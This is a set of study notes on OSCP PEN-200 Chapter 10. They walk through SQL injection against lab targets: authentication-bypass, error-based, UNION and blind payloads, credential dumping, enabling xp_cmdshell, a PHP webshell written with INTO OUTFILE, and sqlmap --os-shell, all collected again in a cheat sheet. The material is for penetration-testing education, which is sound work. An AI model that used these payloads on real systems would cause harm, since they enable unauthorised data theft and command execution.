---
title: "PEN-200 Chapter 10 — SQL Injection Attacks"
aliases:
  - "PEN-200 Ch10 SQLi"
  - "SQL Injection Attacks"
tags:
  - oscp
  - pen-200
  - sqli
  - web
  - mysql
  - mssql
  - sqlmap
status: study-note
source: "PEN-200 Chapter 10 — SQL Injection Attacks"
---

# PEN-200 Chapter 10 — SQL Injection Attacks

> [!summary] Chapter goal
> Understand how SQL injection happens, manually identify and exploit error-based, UNION-based, and blind SQL injection, enumerate MySQL/MSSQL databases, turn SQL access into command execution where permissions allow, and automate exploitation with `sqlmap`.

## Attack-chain position

`Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof`

**Where this chapter fits:**

- **Recon:** Identify a web application or exposed database service that accepts user-controlled input.
- **Enumeration:** Fingerprint the DBMS/version/user, enumerate databases, tables, columns, and application data.
- **Initial Access:** SQLi can bypass authentication or, when the DBMS/filesystem permissions allow it, produce OS command execution through `xp_cmdshell`, a written webshell, or `sqlmap --os-shell`.
- **Privilege Escalation:** SQLi itself does not automatically mean OS privilege escalation. The chapter demonstrates command execution in the context of the MSSQL service account or Linux web-server user, after which normal privilege-escalation methodology applies.
- **Credentials:** A major SQLi objective is extracting usernames, password hashes, or clear-text application/database credentials for later reuse.
- **Pivoting:** Credentials or shell access obtained through SQLi may become the starting point for accessing additional hosts, but pivoting is not taught in this chapter.
- **AD:** If recovered credentials are valid in a Windows/domain environment, they may feed into later AD attacks; AD exploitation itself is outside this chapter.
- **Proof:** Record the vulnerable parameter/payload, extracted data, and command execution (`whoami`, `id`, etc.) as evidence of impact.

---

# 10.1 SQL Theory and Databases

This unit refreshes relational SQL fundamentals and compares syntax/behavior important when working with different DBMS products, especially **MySQL** and **Microsoft SQL Server (MSSQL)**.

## 10.1.1 SQL Theory Refresher

SQL is used to interact with relational databases: querying, inserting, modifying, and deleting data. Depending on the database and privilege level, database functionality can also become a path to operating-system command execution.

A typical web application flow is:

`Browser / frontend → backend application → SQL query → database`

The key SQLi problem is **unsafe construction of SQL statements from user-controlled input**. If the backend inserts raw input directly into a query, the attacker may be able to change the query's structure rather than simply supply data.

### Basic query

```sql
SELECT * FROM users WHERE user_name='leon';
```

**What it does**

- `SELECT` — retrieves data.
- `*` — selects all columns.
- `FROM users` — reads from the `users` table.
- `WHERE user_name='leon'` — keeps only rows matching the specified username.

**When/why:** Use this basic structure while reasoning about what the vulnerable application's original query probably looks like and where your injected text will land.

### Vulnerable PHP pattern shown in the chapter

```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

**Important point:** `$_POST['uname']` and `$_POST['password']` are inserted directly into the SQL string. An attacker who controls those parameters can potentially close the quote, add SQL syntax, and comment out the rest of the intended statement.

`mysqli_query($con, $sql_query)` executes the query using the database connection stored in `$con` and places the result in `$result`.

> [!important] OSCP mindset
> When you find input that is reflected into backend database logic, think in terms of **query context**: string vs numeric input, quote characters, comments, number of columns, DBMS-specific functions, and whether the application displays database errors/results.

---

## 10.1.2 DB Types and Characteristics

The chapter focuses primarily on **MySQL/MariaDB** and **MSSQL**. The same goals apply across products, but commands, functions, metadata tables, authentication, and code-execution features differ.

## MySQL basics

### Connect to MySQL

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

**Tool:** `mysql` command-line client.

**Arguments**

- `-u root` — username is `root`.
- `-p'root'` — password is `root`; the chapter places it directly after `-p`.
- `-h 192.168.50.16` — remote database host.
- `-P 3306` — TCP port, here the standard MySQL port used by the lab.

**When/why:** Use when you already have MySQL credentials or anonymous/authenticated access and want an interactive database shell for enumeration.

### Get MySQL version

```sql
SELECT version();
```

**Function:** `version()` returns the MySQL server version.

**When/why:** DBMS/version fingerprinting helps you choose valid syntax, functions, and exploitation techniques.

### Identify the current database user

```sql
SELECT system_user();
```

**Function:** `system_user()` returns the current MySQL account, including host information.

**When/why:** Determine your database identity and assess likely privileges. Remember that a MySQL `root` account is a **database** administrator and is not automatically Linux root.

### List databases

```sql
SHOW DATABASES;
```

**When/why:** Enumerate available databases and identify custom/non-default databases worth investigating.

### Read a MySQL user's stored authentication value

```sql
SELECT user, authentication_string
FROM mysql.user
WHERE user = 'offsec';
```

**What it does**

- Reads the `user` and `authentication_string` fields from `mysql.user`.
- `WHERE user='offsec'` restricts the output to the requested account.

**When/why:** If your DB privileges allow access to MySQL's system tables, this can expose password hashes or authentication data for credential attacks.

---

## MSSQL basics

### Tools introduced

- **SQLCMD** — Microsoft's command-line utility for issuing SQL statements to SQL Server.
- **Impacket** — Python framework implementing multiple network protocols.
- **`impacket-mssqlclient`** — Impacket's MSSQL/TDS client used from Kali.
- **TDS (Tabular Data Stream)** — protocol used by MSSQL for client/server communication.

### Connect to MSSQL with Windows authentication

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

**Arguments / syntax**

- `Administrator` — username.
- `Lab123` — password.
- `@192.168.50.18` — MSSQL target.
- `-windows-auth` — force Windows/NTLM authentication rather than SQL authentication/Kerberos behavior.

**When/why:** Use when you have Windows credentials that are accepted by the MSSQL service and want an interactive SQL shell from Kali.

### Get MSSQL and Windows version information

```sql
SELECT @@version;
```

**What it does:** Returns SQL Server version information and, in this example, the underlying Windows Server edition/build.

**When/why:** Fingerprint both the DBMS and operating system to guide later exploitation.

> [!note] `sqlcmd` vs remote TDS clients
> With Microsoft's `sqlcmd`, statements are commonly terminated with `;` and then submitted with `GO` on a separate line. The chapter notes that `GO` is not part of the TDS protocol and can be omitted when using a remote client such as `impacket-mssqlclient`.

### List MSSQL databases

```sql
SELECT name FROM sys.databases;
```

**Object:** `sys.databases` is a SQL Server system catalog view.

**When/why:** Identify custom databases instead of spending time only on default databases such as `master`, `tempdb`, `model`, and `msdb`.

### Enumerate tables from a specific database

```sql
SELECT * FROM offsec.information_schema.tables;
```

**What it does:** Queries `information_schema.tables` in the `offsec` database to list tables and their schema/type metadata.

### Read a fully-qualified MSSQL table

```sql
SELECT * FROM offsec.dbo.users;
```

**Name format:**

`database.schema.table`

- `offsec` — database.
- `dbo` — schema.
- `users` — table.

**When/why:** Use after identifying an interesting table. In the chapter, this reveals usernames and clear-text passwords.

---

# 10.2 Manual SQL Exploitation

This unit demonstrates how to manually identify and exploit SQL injection before relying on automation. The main categories covered are **error-based**, **UNION-based**, and **blind** SQLi.

## 10.2.1 Identifying SQLi via Error-based Payloads

### First test: break the query

A simple single quote (`'`) is useful because it may break a string literal in the backend SQL statement. If the application then returns a database syntax error, that is strong evidence that your input reached the SQL parser unsafely.

### Authentication bypass payload

```text
offsec' OR 1=1 -- //
```

The resulting logic becomes similar to:

```sql
SELECT * FROM users WHERE user_name='offsec' OR 1=1 --
```

**Pieces**

- `'` — closes the application's quoted string.
- `OR 1=1` — inserts a condition that is always true.
- `-- ` — starts a SQL comment; MySQL expects whitespace after the two dashes.
- `//` — extra visible trailing characters used in the chapter after the comment marker; because they are inside the comment, they do not affect the query and can help preserve visible whitespace.

**When/why:** Try when a login form appears to place user input directly into a quoted SQL `WHERE` condition. If vulnerable, this may bypass password verification.

### Error-based version enumeration

```text
' OR 1=1 IN (SELECT @@version) -- //
```

**Purpose:** Force database version information into an error condition. The chapter's application displays the MySQL version in an error message.

**Related MySQL version forms**

```sql
SELECT version();
SELECT @@version;
```

### Attempt to retrieve all columns

```text
' OR 1=1 IN (SELECT * FROM users) -- //
```

This fails because the injected expression expects a compatible/single value while `SELECT *` returns multiple columns.

### Retrieve one column

```text
' OR 1=1 IN (SELECT password FROM users) -- //
```

**Purpose:** Leak password values one column at a time through database errors.

### Retrieve one user's password

```text
' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin') -- //
```

**Purpose:** Narrow the error-based result to a predictable account, making leaked credential data easier to map to a username.

> [!tip] Manual workflow for error-based SQLi
> 1. Send normal input and understand the expected response.
> 2. Add `'` and look for a SQL error or behavioral change.
> 3. Determine whether you can terminate/comment the original query.
> 4. Fingerprint DBMS/version.
> 5. Enumerate one value at a time if the error channel has type/column limitations.
> 6. Extract credentials or other high-value data.

---

## 10.2.2 UNION-based Payloads

`UNION` combines the result of a second `SELECT` with the application's original query. It is especially useful for **in-band SQLi** where database output is rendered in the web page.

Two requirements:

1. The injected `UNION SELECT` must return the **same number of columns** as the original query.
2. Corresponding columns must use **compatible data types**.

### Vulnerable application query shown in the chapter

```php
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

`LIKE` performs pattern matching, and `%` is a wildcard for zero or more characters.

### Determine the number of columns with `ORDER BY`

```text
' ORDER BY 1-- //
```

Then increase the number:

```text
' ORDER BY 2-- //
' ORDER BY 3-- //
...
```

**How it works:** `ORDER BY n` fails when column `n` does not exist. In the chapter, `ORDER BY 6` fails, revealing that the original query has **five columns**.

**When/why:** This is one of the fastest manual ways to determine the column count before building a `UNION SELECT` payload.

### First UNION fingerprinting attempt

```text
%' UNION SELECT database(), user(), @@version, null, null -- //
```

**Functions / values**

- `database()` — current database name.
- `user()` — current MySQL user.
- `@@version` — MySQL version.
- `NULL` — neutral placeholder useful when matching unknown data types.

The first output column is not displayed/compatible in the application, so the database name does not show correctly.

### Shift values into displayable/compatible columns

```text
' UNION SELECT null, null, database(), user(), @@version -- //
```

**Purpose:** Keep problematic columns as `NULL` and move useful string output into columns that the page actually renders.

### Enumerate tables and columns from `information_schema`

```text
' UNION SELECT null, table_name, column_name, table_schema, null
FROM information_schema.columns
WHERE table_schema=database() -- //
```

**Objects/functions**

- `information_schema.columns` — metadata describing table columns.
- `table_name` — table name.
- `column_name` — column name.
- `table_schema` — database/schema name.
- `database()` — current database.

**When/why:** Once UNION output works, metadata enumeration tells you what tables/columns exist before you dump application data.

### Dump the `users` table

```text
' UNION SELECT null, username, password, description, null FROM users -- //
```

**Purpose:** Place `username`, `password`, and `description` values into columns the page renders. The chapter uses this to recover user password hashes, including an administrative account.

> [!important] UNION checklist
> Column count first → identify displayed columns → solve type compatibility with `NULL` → fingerprint DB/user/version → enumerate `information_schema` → dump interesting tables.

---

## 10.2.3 Blind SQL Injections

Blind SQLi occurs when the database's result is not directly displayed. Instead, you infer the answer from application behavior.

### Boolean-based blind SQLi

The web application produces different predictable behavior for a TRUE vs FALSE SQL condition.

Example:

```text
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

**Why it works:** `1=1` is always true. If the response matches the known-good page, you have a TRUE condition. Change the condition to test guesses about usernames, tables, characters, etc.

**When/why:** Use when database errors/results are hidden but the page still changes depending on whether the SQL predicate is true.

### Time-based blind SQLi

```text
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

**Functions**

- `IF(condition, true_value, false_value)` — MySQL conditional function.
- `sleep(3)` — delay execution for three seconds.

**How to interpret:** If the tested condition is true, the response is delayed by roughly three seconds. If not, it returns normally.

**When/why:** Use when there is no visible error and no reliable content difference, but you can measure response time.

> [!warning] Tradeoff
> Time-based extraction is slow and sensitive to network latency. The chapter uses this as the transition point to `sqlmap` automation.

---

# 10.3 Manual and Automated Code Execution

SQLi can sometimes move from database access to **operating-system command execution**. Success depends on the DBMS, database account privilege, service account privilege, and filesystem/web-root permissions.

## 10.3.1 Manual Code Execution

## MSSQL: `xp_cmdshell`

`xp_cmdshell` passes a supplied string to a Windows command shell and returns command output as rows. It is disabled by default and is invoked with `EXECUTE`/`EXEC` rather than `SELECT`.

### Connect to MSSQL

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

### Enable advanced configuration

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
```

**Explanation**

- `sp_configure` — SQL Server stored procedure for server configuration.
- `'show advanced options'` — exposes advanced settings.
- `1` — enables the setting.
- `RECONFIGURE` — applies the changed configuration.

### Enable `xp_cmdshell`

```sql
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Execute an OS command

```sql
EXECUTE xp_cmdshell 'whoami';
```

**Result in the chapter:** command execution occurs as the MSSQL service account:

```text
nt service\mssql$sqlexpress
```

**When/why:** Use when you have sufficient SQL Server privileges and want to turn SQL access/SQLi into Windows command execution.

> [!note] Post-RCE implication
> `xp_cmdshell` gives the privileges of the SQL Server service context, not automatically local Administrator/SYSTEM. After obtaining a shell, enumerate the host normally for privilege escalation.

---

## MySQL: write a webshell with `INTO OUTFILE`

Unlike the MSSQL example, the chapter does not use one built-in MySQL command-execution function. Instead, it writes a PHP file into a writable web directory.

### UNION payload to create a webshell

```text
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null
INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

**Pieces**

- `UNION SELECT` — injects a row containing PHP code.
- `system(...)` — PHP function that executes an OS command.
- `$_GET['cmd']` — takes the command from a URL query-string parameter named `cmd`.
- `INTO OUTFILE` — writes the query result to a file.
- `"/var/www/html/tmp/webshell.php"` — target path in a writable web-served directory.

**Requirement:** The operating-system account running the database must be permitted to write to the chosen directory.

The chapter also shows this webshell form:

```php
<? system($_REQUEST['cmd']); ?>
```

Here `$_REQUEST['cmd']` can accept the `cmd` value from request data. The practical goal is the same: send a request such as `?cmd=id` and have PHP execute the command.

### Verify code execution

```text
id
```

The chapter's webshell returns execution as:

```text
www-data
```

**When/why:** A writable web root plus SQL file-write ability can convert SQLi into a stable web-accessible command-execution primitive.

---

## 10.3.2 Automating the Attack

### Tool: `sqlmap`

`sqlmap` automates SQL injection detection, DBMS fingerprinting, enumeration, data extraction, and in some cases OS command execution.

> [!warning] Noise / stealth
> The chapter emphasizes that `sqlmap` generates a high volume of traffic and offers very little stealth. Manual confirmation should come first when traffic volume matters.

### Detect SQLi in a GET parameter

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

**Arguments**

- `-u URL` — target URL.
- `?user=1` — supplies a dummy value for the candidate parameter.
- `-p user` — explicitly tells `sqlmap` to test the `user` parameter.

**What sqlmap reports in the chapter**

- vulnerable parameter: `user`
- injection type: time-based blind
- DBMS: MySQL
- web server OS and application stack details
- generated payload using `SLEEP()`

**When/why:** Use after identifying a likely SQLi parameter, especially when manual extraction would be tedious.

### Dump the database

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

**New argument**

- `--dump` — enumerate and retrieve database table contents.

**Behavior in the chapter:** Because the vulnerability is time-based blind, dumping is slow. `sqlmap` identifies the current database (`offsec`), enumerates tables such as `customers` and `users`, discovers columns, and extracts credential rows/hashes.

### Burp Suite: capture a POST request

The chapter uses **Burp Suite** to intercept a request to `/search.php` and saves it locally as `post.txt`.

Representative body:

```http
POST /search.php HTTP/1.1
Host: 192.168.50.19
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...

item=test
```

**When/why:** Saving a raw request is useful when the injection lives in POST data, authenticated requests, cookies, or requests that are inconvenient to reconstruct manually on the command line.

### Feed the saved POST request to sqlmap and obtain an OS shell

```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

**Arguments**

- `-r post.txt` — read the complete HTTP request from a file.
- `-p item` — test the `item` POST parameter.
- `--os-shell` — attempt to obtain an interactive operating-system shell.
- `--web-root "/var/www/html/tmp"` — specify a known writable web document directory for the web stager/backdoor.

**What happens in the chapter**

1. `sqlmap` parses the request.
2. It confirms MySQL and the Linux target.
3. It asks for the server-side language; PHP is chosen.
4. It attempts to upload a file stager/backdoor into the supplied web root.
5. It starts an interactive `os-shell`.

### Commands run inside `sqlmap` OS shell

```text
os-shell> id
```

**Purpose:** Confirm current UID/GID and execution identity.

```text
os-shell> pwd
```

**Purpose:** Confirm the current working directory. In the chapter the shell is operating from `/var/www/html/tmp`.

---

# 10.4 Wrapping Up

The chapter's complete progression is:

1. Understand how application input reaches SQL queries.
2. Recognize MySQL/MSSQL differences.
3. Manually test input with quote/error behavior.
4. Use always-true logic for authentication bypass.
5. Use error-based SQLi to leak values.
6. Use `ORDER BY` to determine the number of columns.
7. Use `UNION SELECT` to return DB metadata and table contents in-band.
8. Use boolean/time behavior when output is blind.
9. Convert powerful DB access into OS code execution when permissions allow:
   - MSSQL → `xp_cmdshell`
   - MySQL → file write/webshell
10. Automate detection, dumping, and OS-shell attempts with `sqlmap`.

---

# Tools and Commands Reference

## `mysql`

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

Use for direct MySQL access when credentials are known.

| Argument | Meaning |
|---|---|
| `-u root` | MySQL username |
| `-p'root'` | Password |
| `-h <host>` | Remote host |
| `-P <port>` | TCP port |

## `impacket-mssqlclient`

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

Use for remote MSSQL interaction from Kali.

| Part | Meaning |
|---|---|
| `Administrator:Lab123@host` | `username:password@target` |
| `-windows-auth` | Windows/NTLM authentication |

## `sqlmap`

```bash
sqlmap -u <URL> -p <parameter>
sqlmap -u <URL> -p <parameter> --dump
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

| Option | Meaning |
|---|---|
| `-u` | Target URL |
| `-p` | Parameter to test |
| `--dump` | Dump table contents |
| `-r` | Load raw HTTP request from file |
| `--os-shell` | Attempt interactive OS command shell |
| `--web-root` | Known writable web root used for shell/stager placement |

## Burp Suite

Use Burp Proxy to intercept authenticated/POST requests, modify parameters manually, and save a complete raw request for tools such as `sqlmap -r`.

---

# SQLi Decision Flow for a Machine

```text
User-controlled web parameter
        |
        v
Send normal request → establish baseline
        |
        v
Test quote / special character: '
        |
        +--> SQL error / different behavior? ---- no ----> Try boolean/time behavior
        |                                              |
       yes                                             v
        |                                       Blind SQLi testing
        v                                       - boolean TRUE/FALSE
Determine DBMS / context                         - time delay
        |
        +--> In-band output visible?
        |        |
        |       yes
        |        v
        |   Error-based / UNION-based
        |   - ORDER BY column count
        |   - UNION SELECT + NULLs
        |   - database(), user(), @@version
        |   - information_schema
        |   - dump credentials
        |
        +--> Can DB write files / execute commands?
                 |
                 +--> MSSQL: xp_cmdshell
                 +--> MySQL: INTO OUTFILE → webshell
                 +--> sqlmap: --os-shell
        |
        v
Shell / credentials → continue normal OSCP enumeration
```

---

# OSCP Mini Cheat Sheet — Chapter 10

> [!tip] Keep these beside you when testing a web parameter for SQLi.

1. **Break a quoted query**
   ```text
   '
   ```
   Look for SQL errors or a meaningful response change.

2. **Authentication bypass pattern**
   ```text
   ' OR 1=1 -- //
   ```

3. **Remember MySQL comment whitespace**
   ```text
   -- 
   ```
   Two dashes followed by whitespace.

4. **MySQL fingerprint**
   ```sql
   SELECT version();
   SELECT @@version;
   SELECT system_user();
   ```

5. **List MySQL databases**
   ```sql
   SHOW DATABASES;
   ```

6. **MSSQL fingerprint**
   ```sql
   SELECT @@version;
   ```

7. **List MSSQL databases**
   ```sql
   SELECT name FROM sys.databases;
   ```

8. **UNION column-count check**
   ```text
   ' ORDER BY 1-- //
   ' ORDER BY 2-- //
   ...
   ```
   First failing number = one more than the column count.

9. **UNION type-safe skeleton**
   ```text
   ' UNION SELECT null, null, null, null, null -- //
   ```
   Replace `NULL`s one at a time with useful values.

10. **MySQL UNION fingerprint**
    ```text
    ' UNION SELECT null, null, database(), user(), @@version -- //
    ```

11. **Enumerate current MySQL schema**
    ```text
    ' UNION SELECT null, table_name, column_name, table_schema, null
    FROM information_schema.columns
    WHERE table_schema=database() -- //
    ```

12. **Dump an interesting table**
    ```text
    ' UNION SELECT null, username, password, description, null FROM users -- //
    ```

13. **Boolean blind test**
    ```text
    ' AND 1=1 -- //
    ```
    Compare with a false condition.

14. **Time-based blind test (MySQL)**
    ```text
    ' AND IF (1=1, sleep(3),'false') -- //
    ```

15. **MSSQL → enable `xp_cmdshell`**
    ```sql
    EXECUTE sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXECUTE xp_cmdshell 'whoami';
    ```

16. **MySQL file-write → webshell**
    ```text
    ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null
    INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
    ```
    Requires a writable path and web-served directory.

17. **sqlmap: test one GET parameter**
    ```bash
    sqlmap -u 'http://TARGET/page.php?user=1' -p user
    ```

18. **sqlmap: dump data**
    ```bash
    sqlmap -u 'http://TARGET/page.php?user=1' -p user --dump
    ```

19. **sqlmap: use captured POST request**
    ```bash
    sqlmap -r post.txt -p item
    ```

20. **sqlmap: attempt OS shell**
    ```bash
    sqlmap -r post.txt -p item --os-shell --web-root '/var/www/html/tmp'
    ```

---

# Exam Reminders

- Confirm SQLi manually before letting automation loose when possible.
- Do not assume the number of columns from what the page visually displays.
- For UNION attacks, **column count and compatible data types matter**.
- `NULL` is your friend for finding working UNION column positions.
- Hidden DB output does not mean no SQLi: test boolean and time behavior.
- Time-based extraction is slow; automate once you understand the vulnerable parameter.
- Database administrator privileges are not identical to OS root/SYSTEM privileges.
- OS command execution inherits the context of the database/web service account.
- Credentials recovered from databases can be more valuable than immediate RCE because they may be reusable elsewhere.
- If file-write attacks fail, check both **database privilege** and **filesystem write permission/path**.
- After getting RCE, switch back to normal host methodology: enumerate users, services, files, credentials, and privilege-escalation paths.
- Save proof as you go: request/payload, DB fingerprint, extracted credential data, and shell identity (`whoami`/`id`).

